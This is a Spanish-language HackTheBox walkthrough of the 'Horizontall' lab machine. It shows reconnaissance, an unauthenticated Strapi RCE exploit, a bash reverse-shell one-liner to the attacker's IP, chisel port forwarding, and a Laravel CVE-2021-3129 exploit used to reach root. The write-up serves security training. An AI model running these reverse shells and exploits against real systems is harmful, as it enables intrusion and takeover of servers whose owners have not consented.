---
title: HTB - Horizontall
published: true
categories: [Linux]
tags: [eJPT, eWPT, Fácil]
---


<img src="/assets/HTB/Horizontall/horizontall.png">

¡Hola!
Vamos a resolver de la máquina `Horizontall` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Information Leakage**
- **Port Forwarding**
- **Strapi CMS Exploitation**
- **Laravel Exploitation**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Horizontall`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.105
PING 10.10.11.105 (10.10.11.105) 56(84) bytes of data.
64 bytes from 10.10.11.105: icmp_seq=1 ttl=63 time=42.3 ms

--- 10.10.11.105 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.105 -oG allPorts

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80 10.10.11.105 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.11.105
http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```
Agregamos `horizontall.htb` a nuestro `/etc/hosts`

La web en sí mismo no tiene muchas funcionalidades. Inspeccionamos las solicitudes de la web y encontramos algunos archivos interesantes JavaScript. Extraemos el código del scritp `app.c68eb462.js` y con la ayuda de [js-beautify](https://beautifier.io/) encontramos un fragmento de código que hace referencia a una api

<img src="/assets/HTB/Horizontall/script.png">

<img src="/assets/HTB/Horizontall/api.png">

Peocedemos a aplicar fuzzing al dominio de la API

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000245:   200        16 L     101 W      854 Ch      "admin"                                                                                                                   
000000188:   403        0 L      1 W        60 Ch       "users"                                                                                                                   
000000123:   200        0 L      21 W       507 Ch      "reviews"                                                                                                                 
000001595:   200        0 L      21 W       507 Ch      "Reviews"                                                                                                                 
000003687:   403        0 L      1 W        60 Ch       "Users"                                                                                                                   
000006084:   200        16 L     101 W      854 Ch      "Admin"    
```

Accedemos a `http://api-prod.horizontall.htb/admin/` y nos redirige a un panel de login del gestor de contenido Strapi

<img src="/assets/HTB/Horizontall/strapi.png">

Buscamos por vulnerabilidades asociadas a Strapi con la herramienta `searchsploit`

```bash
❯ searchsploit strapi
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                       | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                     | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                               | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                 | nodejs/webapps/50716.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Como no tenemos credenciales todavía optaremos por el script `50239.py` que nos brinda un RCE sin la necesidad de estar autenticados. Nos lo traemos a nuestro directorio de trabajo `exploits` lo renombramos y ejecutamos pasándole como parámetro la url

```bash
❯ python3 strapi_exploit.py http://api-prod.horizontall.htb/
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjY5Mjg0MTIxLCJleHAiOjE2NzE4NzYxMjF9.jfVg4L3kjN81-CJu2MScnUJCHFUp26Kpy_GlYDkiddI


$> 
```

Hemos conseguido una pseudo-consola en la que poder ejecutar comandos de forma remota. Nos ponemos en escucha en el puerto 443 en nuestro equipo y procedemos a ejecutar el oneliner típico para entablar una reverse shell en bash

```bash
# ATACANTE
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [10.10.11.105] from (UNKNOWN) [10.10.11.105] 45076
bash: cannot set terminal process group (1965): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ whoami
whoami
strapi
```

```bash
# VICTIMA
$> bash -c 'bash -i >& /dev/tcp/10.10.14.73/443 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

La flag de usuario se encuentra en `/home/developer/user.txt`

```bash
strapi@horizontall:~/myapi$ cat /home/developer/user.txt 
abab48f102ce8a57***************
```

### Escalada De Privilegios

* * *

No tenemos credenciales de `strapi` por lo que no podemos ver privilegios de sudo. Procedemos a enumerar conexiones de nuestro localhost que no su hbieran visto con la herramienta `nmap`

```bash
strapi@horizontall:~/myapi$ ss -alnp | grep 127.0.0.1
tcp  LISTEN 0      80                                      127.0.0.1:3306                     0.0.0.0:*                                                         
tcp  LISTEN 0      128                                     127.0.0.1:1337                     0.0.0.0:*              users:(("node",pid=1965,fd=31))            
tcp  LISTEN 0      128                                     127.0.0.1:8000                     0.0.0.0:*                                                         
```
Reconocemos el puerto 3306 que pertenece a `MySQL` pero desconocemos los servicios que corren en los puertos 1337 y 8000. Utilizamos `curl` para observar su contenido

```bash
strapi@horizontall:~/myapi$ curl 127.0.0.1:1337
.
.
<body lang="en">
    <section>
      <div class="wrapper">
        <h1>Welcome.</h1>
      </div>
    </section>
  </body>
.
.
```

```bash
strapi@horizontall:~/myapi$ curl 127.0.0.1:8000
.
.
<div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
</div>
.
.
```

En el puerto 1337 vemos la página inicial del CMS con un mensaje `Welcome`. Sin embargo en el puerto 8000 encontramos un framework `Laravel`. la enumeración externa no reveló ninguna información sobre laravel. Para investigar un poco más con la herramienta `chisel` vamos a aplicar un Remote Port Forwarding para poder traerme el puerto 8000 de la máquina a mi equipo

```bash
# ATACANTE
❯ ./chisel server --reverse -p 1234
2022/11/24 11:36:35 server: Reverse tunnelling enabled
2022/11/24 11:36:35 server: Fingerprint VQ+8oFxrx7zSF9eWwaoPROxLxOYKXT7GMLJ3ZvNJ3zY=
2022/11/24 11:36:35 server: Listening on http://0.0.0.0:1234
2022/11/24 11:37:22 server: session#1: tun: proxy#R:8000=>8000: Listening
```

```bash
# VICTIMA
strapi@horizontall:/tmp$ ./chisel client 10.10.14.73:1234 R:8000:127.0.0.1:8000
2022/11/24 10:37:22 client: Connecting to ws://10.10.14.73:1234
2022/11/24 10:37:22 client: Connected (Latency 43.85418ms)
```
Ahora ya podemos acceder a través de `http://localhost:8000`

<img src="/assets/HTB/Horizontall/8000.png">

Buscando por vulnerabilidades asociadas a esta versión de laravel encontramos este repositorio de [nth347](https://github.com/nth347/CVE-2021-3129_exploit). Nos lo clonamos y traemos a nuestro equipo. Ejecutamos script según sus instrucciones

```bash
❯ python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 whoami
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Clonando en 'phpggc'...
remote: Enumerating objects: 3150, done.
remote: Counting objects: 100% (696/696), done.
remote: Compressing objects: 100% (262/262), done.
remote: Total 3150 (delta 458), reused 552 (delta 404), pack-reused 2454
Recibiendo objetos: 100% (3150/3150), 462.79 KiB | 2.36 MiB/s, listo.
Resolviendo deltas: 100% (1330/1330), listo.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

root

[i] Trying to clear logs
[+] Logs cleared
```

Ya sabemos que funciona. Esta vez en vez de ejecutar whoami ejecutaremos un `curl` a nuestra dirección IP en dónde tendremos un servidor HTTP levantado en el puerto 80 con un archivo index.html cuyo contenido es un oneliner para entablar una reverse shell en bash. Nos ponemos en escucha en el puerto 443 y ejecutamos el script

<img src="/assets/HTB/Horizontall/root.png">

La flag de root la encontramos en la ruta `/root/root.txt`

```bash
root@horizontall:/home/developer/myproject/public# cat /root/root.txt
cat /root/root.txt
9a66032c5f8be80f8***************
```

Hemos completado la máquina **Horizontall** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/Horizontall/pwned.png">
